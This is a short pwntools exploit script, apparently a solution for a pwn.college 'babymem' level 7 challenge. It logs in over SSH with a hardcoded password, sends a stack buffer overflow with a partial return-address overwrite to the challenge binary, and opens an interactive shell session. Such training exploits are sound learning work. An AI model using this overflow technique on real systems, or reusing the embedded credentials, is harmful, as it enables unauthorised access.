from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

context.log_level = 'debug'
p = s.process("./babymem_level7_testing2")
# p = process('./babymem_level7_testing1')

# p.recvuntil(b'(rsp+0x0098)')
# pie_base = int(p.recvline().split(b' ')[-2],16) - 0x1D49
# print(pie_base)

p.sendlineafter(b'Payload size: ',b'1000')
pay = b'A'*0x78 + p16(0xfD90)
# pause()
p.sendafter(b'bytes)!\n',pay)
p.interactive()